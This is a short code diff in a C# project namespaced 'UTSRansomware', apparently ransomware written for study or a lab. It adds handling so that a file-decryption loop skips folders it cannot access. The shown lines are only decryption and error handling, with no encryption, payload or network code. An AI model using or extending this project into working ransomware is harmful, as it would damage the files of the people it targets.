@@ -52,7 +52,13 @@ namespace UTSRansomware
                 {
                     DecryptFile(filePath);
                 }
-            } catch (Exception ex)
+            }
+            catch (UnauthorizedAccessException)
+            {
+                Console.WriteLine($"Access denied to: {parentDirectory}. Skipping...");
+            }
+
+            catch (Exception ex)
             {
                 Console.WriteLine(ex.ToString());
             }
